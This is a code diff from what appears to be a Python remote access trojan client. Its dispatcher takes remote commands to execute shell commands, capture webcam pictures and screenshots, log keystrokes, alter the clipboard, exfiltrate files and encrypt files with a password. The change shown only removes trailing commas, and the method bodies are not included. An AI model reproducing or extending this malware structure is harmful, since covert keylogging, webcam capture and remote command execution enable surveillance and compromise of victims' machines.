@@ -36,19 +36,19 @@ class Client:
             self.response["error"] = str()
 
             if request["cmd"] == "c":
-                process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
+                process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"]))
                 self.handle_process(process, request["timeout"])
             elif request["cmd"] == "z":
                 process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
-                    self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
+                    self.response, request["comp_lvl"], request["open_path"], request["save_path"]))
                 self.handle_process(process, request["timeout"])
             elif request["cmd"] == "w":
                 process = multiprocessing.Process(target=self.capture_camera_picture,
-                                                  args=(self.response, request["cam_port"], request["save_path"],))
+                                                  args=(self.response, request["cam_port"], request["save_path"]))
                 self.handle_process(process, request["timeout"])
             elif request["cmd"] == "s":
                 process = multiprocessing.Process(target=self.capture_screenshot,
-                                                  args=(self.response, request["monitor"], request["save_path"],))
+                                                  args=(self.response, request["monitor"], request["save_path"]))
                 self.handle_process(process, request["timeout"])
             elif request["cmd"] == "d":
                 process = multiprocessing.Process(target=self.download_file, args=(self.response, request["open_path"]))
@@ -64,12 +64,12 @@ class Client:
             elif request["cmd"] == "k":
                 self.log_keys(self.response, request["action"], request["save_path"])
             elif request["cmd"] == "b":
-                process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"],))
+                process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"]))
                 self.handle_process(process, request["timeout"])
             elif request["cmd"] == "e":
                 process = multiprocessing.Process(target=self.crypt,
                                                   args=(self.response, request["action"], request["open_path"],
-                                                        request["password"],))
+                                                        request["password"]))
                 self.handle_process(process, request["timeout"])
             self.connection.send(self.response)
 
